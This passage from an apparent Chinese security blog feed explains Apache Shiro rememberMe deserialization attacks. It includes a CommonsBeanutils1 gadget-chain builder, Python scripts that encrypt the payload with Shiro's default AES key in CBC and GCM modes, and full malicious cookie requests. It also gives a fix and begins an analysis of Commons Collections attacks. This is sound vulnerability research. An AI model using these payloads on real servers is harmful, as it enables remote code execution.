class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ReverseComparator与CaseInsensitiveComparator均符合同时实现了Comparator和Serializable，且原生JDK自带。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="comment">// BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先正常比较，以防在序列化时就触发恶意行为</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再利用反射将property设置为outputProperties，以调用obj的getter方法，即TemplatesImpl.getOutputProperties</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="comment">// 最好进行恶意比较，以触发getOutputProperties方法的执行，最终实现通过TemplatesImpl加载恶意字节码</span></span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----------------本地序列化与反序列化测试----------------</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cb.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cb.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Python AES-CBC加密编码脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cb.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>), AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cookie: rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))</span><br></pre></td></tr></table></figure><h3 id="实测-1"><a href="#实测-1" class="headerlink" title="实测"></a>实测</h3><p>1.4.0、1.4.1两个版本，CB1链利用成功。</p><p><img src="/img/post/apache-shiro-deserialization-exploitation/0.png"></p><h2 id="1-4-2-≤-shiro-≤-2-0-0"><a href="#1-4-2-≤-shiro-≤-2-0-0" class="headerlink" title="1.4.2 ≤ shiro ≤ 2.0.0+"></a>1.4.2 ≤ shiro ≤ 2.0.0+</h2><p>由于1.4.2之前的版本受Shiro-721漏洞的影响，在1.4.2及之后的版本，官方更换了AES加密算法的模式，由CBC改为了GCM。</p><p>不过在shiro.ini配置文件中设置密钥的字段还是如下，并没有被注释。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">securityManager.rememberMeManager.cipherKey</span> = kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>那么将CB1链与下面的Python AES-GCM加密编码脚本结合，即可进行反序列化利用。高版本Shiro中的commons-beanutils为1.9.4版本，本地构造Payload时，注意版本一致性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cb.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    cipher = AES.new(base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>), AES.MODE_GCM, iv)</span><br><span class="line">    ciphertext, tag = cipher.encrypt_and_digest(data)</span><br><span class="line">    ciphertext = ciphertext + tag</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cookie: rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64_ciphertext.decode()))</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8888</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=GoJ1GFjFQCe41mwyKzIdU3Lgzm/Sp/I4V54gbDrei1bpIWnHgNEFvF5GvQXJRBs9mSDdRZWhQGlsvl9vyLvWHn/IVM/3iUqBzk0WZr89Ez58kHIrDFaJI/xzn6NSgzzWxZyh/B8iXGHd/KG5cXIFj6G4X2oEqpNv3d6QK+NbBkceUDvErG0jRSSuwCaIRQc91AVDbtVcC71Qzt6KIoLcoMbwbku+w7ZMlLWXSNatrQWgU7hXRIpPp0jBhgVj5pB0zFTKPHISPLCSCAAnXgwrgOldx63/T8KKlRzY/RkF7Ft8Ax6dC/g3CecLHOmlzJaU3JuUx5ZvV5Tjp1kfQeSLkMvr3ORBxiLrZiw77P/WGTpSOvLRVfygxAxIGgdTDP8kOl1BdCtMofNCwLYooIJbpPYnzEz/PGvHcO+++7FNPtW8eqAfJ7BGaS+eVsr0qiXKAer94/pHU3agmmCZOmMh1X52r3nXkzJnzleXcOU47ID4PO3ClyGoOS023Hpxq2wz2ztWnVQqR7RnzKun/ks8JPsZguPQx+FlSpEvTbYx1kK0btv6JlX7dIlWJE6I1SjW7h8TZ5gYxhf5RtTTDgOBBcHKpOLNEOvfm36nEtjivchZ7oikTwW6oS0Cu2wNUAqSjexqyFbWwt8KdhwRnr/A96d8iWo+/tMxrJX4j63wnVZfxRnBL7jZaDqI29qm0O1ljj1en8WzG8T+SItMLx2qXQdYCk4eK4YZ8JjkzvrGtEjKB8QWlaDpqRIW8XmklVKXPp/tT/KfX/W1oHLiIms3NGvtd6UL/MWbslimklHAfInC7CzzND1wND3bSQv6j8gS6I6+/2thvVWeTsK229a2V9QS5DOjT2AosDhiT1m2JYeYFQT3UnKHO64erwSMyJ4zJLkrd2dglL+eHIqg1Jo84J5zTnmX7CrgBaztnd5gbIkL/O1mETRQOaK1Vt86VX3j0FVEKTzC3zPi5XY0+JQkqKTMH4zYX8KW5J5dClYEyrIQknc7+nsTVTDBiF5xUeyN9ac4MO1+xOnprnEOa2DyJMptxHjacZd56nN/xv3Eel9GRYXiBc1i8c9nOCu0Cj7OOFrrncdEK8CUmxP1Psykve0U7cea12dO2MpdaHlby+z+QRXikLWD3Zwy2O/2dbebRsqFaw0NVuTMdrGDdCpiEGlRItp36zynWtL6vPlrPeNs54sdKIWjJ/HHLW0utzQOMT4NPTJ3TsDiAkTM7tSV4Izz3oQiA5OQTcGGwBaWJsuP0vRYPBYMcSrHwtcDq1NrQUaCSZBiWWS6NZXipd287lRlXrNp9SEkJE1oak2+8/odG8fGQdZN8t4mB2lGAnJNbpI3zMh0cQ/ZUYlDawlUKuyMY7gs9NFP6SOO93+432w77Gky7z4/0uL20ccWn3VlQX1wN0VFt/bL/q3RMIH5trICeSdjedZNlKLqKOB32V9uaR0+6/aM80N2ih76EDUy4LgRJ8eA7uqcsXeQOX1fYWXgF59P3DpAY3odtZX+F3FmPYZ7bE7TF8LrXUiBuUQ+jitElvPwQi8ECx+78+zckX7UJjkV+mCXnyczF/v70XORPYf6qssLBa0jBqA57kayiMCLPmO/8T9a6DTCdYgYoYNV7LpJAiB6ng4NK2gNCRbYdGuAvp3vUuTrQepGdCArSEYYwy340hDwy4ofkckD+IGV2CjZgHI5p+y3iPWz08GMD8dougfbNfXz4diWl0rSGQiCIHQs41TR5QFRwm5dn7kxlXT+KymTOqbINdgzF4El54yVNu3Sa8GnqJJsW+nW9XyPCR+HhmvyBTCHmqFK4Rk7ROQp7lkUv0zmz80kDh6W4mN3t2SW1CnxH2G1KChY1otbge9VEXOnG/zFWH1ajNZyOrMjVywraALTgB/1B1697RyKUjXZDMCF+GyqyMJcitXCZ7dK20mFiq2tOC0FsyBY04gllB+cI1ykUnR29IUqFp3K6s8ejuScveFbv0f/bp4ePrTn6wp/PYqjFgTwFPCn6/vRBcmlMrKVQtv9lGA2YyfVhTY+4srOei0zCvNVuZGIYvqTQ+leyJWB66VBELDJQwOhgAZm5bnLKtkhH01AFCj+sMG8EfbubPmaGslnKk+HVpsORq1sfiBAWBCnc8oL82g7lurzEU2ddlMvc9HaroU/XTMkdoxXrQQ0gTObA2fGONUjWn6+7stVqa/p7wA087/CltLAILj9JnEGGYMN95uL08IHs4B2w8k5N8JKbDOC96FKP+YtFibDdtQnlxCgy11dmWpgsyaZgszv0j27WHNfz3D0HveTvYM29fep9oMjM+cgXBauHjEqowWcb6V21OaX2YFavvNPezLYaq9RCCqOqu/DLJ3JVtjxH3rnuICweRvO7xChHGCSnJPPXAMgCc+4XmO0PGXca2fZTB8xK8wM3KnHFOqbZGMhis8CXWrtUD0Z+bYsw7m0cd1qgvA2dcOKuNps3OO6Qy+gGeYBzGhHRuWX05N7k+TRsGL+tN7uoB/7tmQYIDpV20uLNy3hZVOvwpO8ZID3aXcgmSq5/GcouFgjNRnN4Zmr/nkqlfMSy0+ZhOJ0/gPpHk2wJOdWiBAIyqAV0K2WFMTA1Y1x75xfaCivIORxyMlq2+X/PaBqWt3SXX6tjoJRDyzsGkC0A8edWjL+6WO3Y8qM6bCidQLQHEQ=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实测-2"><a href="#实测-2" class="headerlink" title="实测"></a>实测</h3><p>1.4.2、1.5.3、1.7.1、1.8.0、1.10.1、1.12.0、1.13.0版本，CB1链均能够成功利用。</p><p><img src="/img/post/apache-shiro-deserialization-exploitation/1.png"></p><p>在目前最新的2.0.0版本中也能成功利用，该版本于2024年02月21日发布，对Java的要求在11及以上。</p><p><a href="https://github.com/apache/shiro/releases/tag/shiro-root-2.0.0">https://github.com/apache/shiro/releases/tag/shiro-root-2.0.0</a></p><p><img src="/img/post/apache-shiro-deserialization-exploitation/2.png"></p><h2 id="正确修复方式"><a href="#正确修复方式" class="headerlink" title="正确修复方式"></a>正确修复方式</h2><p>开发者不应该在shiro.ini中设置密钥，应将如下字段注释掉。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#securityManager.rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==</span></span><br></pre></td></tr></table></figure><p>这样便会改由generateNewKey方法在应用程序每次启动时，自动生成一个随机的密钥。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Key <span class="title function_">generateNewKey</span><span class="params">(<span class="type">int</span> keyBitSize)</span> &#123;</span><br><span class="line">    KeyGenerator kg;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        kg = KeyGenerator.getInstance(getAlgorithmName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to acquire &quot;</span> + getAlgorithmName() + <span class="string">&quot; algorithm.  This is required to function.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">    kg.init(keyBitSize);</span><br><span class="line">    <span class="keyword">return</span> kg.generateKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Commons Collections攻击Shiro550</title>
      <link href="/attacking-shiro550-with-commons-collections.html"/>
      <url>/attacking-shiro550-with-commons-collections.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%BC%95%E5%AD%90">0x00 引子</a></li><li><a href="#0x01-%E6%94%BB%E5%87%BB%E5%B0%9D%E8%AF%95">0x01 攻击尝试</a></li><li><a href="#0x02-%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90">0x02 异常分析</a></li><li><a href="#0x03-JRMP">0x03 JRMP</a></li><li><a href="#0x04-CommonsCollections4Shiro">0x04 CommonsCollections4Shiro</a></li><li><a href="#0x05-CommonsCollections2">0x05 CommonsCollections2</a></li><li><a href="#0x06-%E5%8F%82%E8%80%83">0x06 参考</a></li></ul><h2 id="0x00-引子"><a href="#0x00-引子" class="headerlink" title="0x00 引子"></a>0x00 引子</h2><p>在上一篇<a href="https://0xf4n9x.github.io/cve-2016-4437-apache-shiro-rce.html">《CVE-2016-4437 SHIRO-550反序列化漏洞》</a>文章中，由于默认Shiro中的Commons Collections是不完整的，所以只演示了利用CommonsBeanutils1链攻击Shiro应用。</p><p>现在假设应用中存在完整的Commons Collections组件（这种情况在实战环境中也是很常见的），在这种情况下又该如何进行攻击利用？</p><h2 id="0x01-攻击尝试"><a href="#0x01-攻击尝试" class="headerlink" title="0x01 攻击尝试"></a>0x01 攻击尝试</h2><p>这里先以3.2.1版本的Commons Collections为例，我们首先在Shiro项目中通过Maven引入它的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>跟此前利用CommonsBeanutils1的方式一样，对CommonsCollections6生成的反序列化数据进行加密和编码，然后构造恶意HTTP请求并发送，如下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.11.34.121:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/css,*/*;q=0.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=S3zrNOcqSj+w6THQhxdlWBY+m+jymoJVGZcHBexpNAcjdYwLDa7GvhTFXd+ud/s2l2bWYD3k/O3j65r9DEC5YlwGSiisq0L5K0P/J0TEaZ5zpkXeHYJXclKNpEL7y2ZOGLKA3AUA+YN4u8uiCpse/75rEwtdNjjt8ARoxi7//iTEom+YBxe+NCMI0ODcFHTWvPGOHX63EXWM8c9UOWOe9NwTGcOCzD/JPsC5FHcmBJPyV4hUvMH/JViekJfrWOY8aH5tXZJiEJlpskEMa7ZIdSBII0d4BLyFYqqjTyVuM04PQ3RSL4eyhjsjEmfXlZm476i7dBaC98RvC4RdXbF8BXNxiKNV5FY7+h+HLkHTIVtMGRFvBmLDIihzqre0jAUc87M3F34RWQozp5zu3Stoi1JHR2QQ/HSUo0XAv72qyjI6M537QFeoU8zbiEXjAd7CRlMAoNNvbkcEBvrJPqDLW7kI2UzR/AePRoymvxrNJ2OxTBW9nvElItGrsEam8GhROdo0xdylYzw7Qedx7lX8m6S2bQ0vySjro6di7jZcSDWo1XHX5wVcQmpC3stv04yl4baNKOWmYl/fFs8xTX8/YQiJiTac3YQWLvYKq78qkRLveI8+rUce6JACUiFDGUwgTTlx1HJPLtpHoCeCk5Kn6bU4IWcc1UuZMDHrU3S2Cgt6akzXZnb6oqm3nU3aw1kEGQrxBWG5FEutdKDp7+E7N2wOHlBCf6G8WKmruWRSyMVZ1Y3D3Caunazlvp3Fef/7ZHjiXWkSAe7oSm3zIr294MJegKDiv/dOqyTpzB9/i3NfEtplKw1KGInmDOYRfS5amFZIE4R+DNC2itD3ACiVa0cUmuWdFgjbd3v4zmBoCcjfIIz7GDSsBbuwt+VUGTB7DitIfQZ2Iy0KQu3WY3ZIY/VFymMNKVsmJ0NEBOvTMAL3eTsJ1L/Q5sTf7isjqqjAUpXWwTsCaJewW3V+efexvmtlZGnmHwlKUSuaczE1IgS3Kd5Cp1cSXIE4rjyhfsfWrXzDdQOT4p5Ak8LYevW6dhoyxSPdgSB+wyVq5cB4ivg4asOsMBUWGxPWA7nh/52QsDHhtNTGRz60iVxVJV2oYbT03T4oqRxxJpgYu5ZWQjRbDX0YgcLAiOaH4zf7Cs4FxLR5Ge9K6QGfCXdbcqcD9aw91ZJgOsZIW68K990f3pc+dhddFctTTofB8FYO6M4Nn4ZizzZtv5Lv+nwhLmGqXhJLa3wnktTFQLDHLSk6anJ2HagP0aGnLMPk1yPAZlCpG6xqLt9JhLaiMgnuM8cm9PJrNXU9GSxQcJ+W7JSKaWQZDZi3LvOHrS7iXyvvIreBCP2jSLB02qXDqlTLDbADIvhANr1aTe4y3wbCcQJ5P6AO49YST0rROUAVJOfW0x+HputRtrETE5dr6F5CGpMQXhAqRTrOcAtSCg+r05YKnRaHD1F0Dj/0JsUqPyhMWJb9EX6YfiXfUvv79qA5VAILAenJrw0L5EAlx9EssjeItN+sWsR9GGcpxGjNS4JTXk5KwOvR60xYwkj7qYo5CxCiwa/A7VPQIlSLAkautydTaoY=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送后，计算器没任何反应，如上利用似乎并不管用，这是为何？</p><h2 id="0x02-异常分析"><a href="#0x02-异常分析" class="headerlink" title="0x02 异常分析"></a>0x02 异常分析</h2><p>回到IDEA中检查日志，可发现出现了如下异常报错日志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br><span class="line">at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)</span><br><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>先看看ClassResolvingObjectInputStream#resolveClass方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.shiro.io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.UnknownClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassResolvingObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassResolvingObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassResolvingObjectInputStream这个类继承ObjectInputStream，如上resolveClass这个方法则是对ObjectInputStream#resolveClass的重写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在反序列化的过程中需要根据序列化数据中的类描述符来加载对应的类，而resolveClass方法的作用就是根据给定的ObjectStreamClass描述符，解析出对应的类。</p><p>对比如上两个resolveClass，其中的不同点就在于Shiro中使用的是ClassUtils.forName获取类对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassUtils.forName(osc.getName());</span><br></pre></td></tr></table></figure><p>继续进入到ClassUtils.forName方法中，该方法会尝试使用三种不同的类加载器加载指定的类，按照如下顺序：</p><ol><li>当前线程的上下文类加载器：首先尝试通过THREAD_CL_ACCESSOR对象的loadClass方法加载类。</li><li>ClassUtils类的类加载器：如果无法通过上下文类加载器加载类，则尝试通过CLASS_CL_ACCESSOR对象的loadClass方法加载类。</li><li>系统或应用程序类加载器：如果上述两种类加载器都无法加载类，则尝试通过SYSTEM_CL_ACCESSOR对象的loadClass方法加载类。</li></ol><p>如果无法从任何类加载器加载指定的类，则会抛出UnknownClassException异常，表示无法找到指定的类。</p><p>首次调用的是THREAD_CL_ACCESSOR.loadClass对fqcn（Fully-Qualified Class Name，完全限定类名）进行加载，我们先来看看这第一种。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title 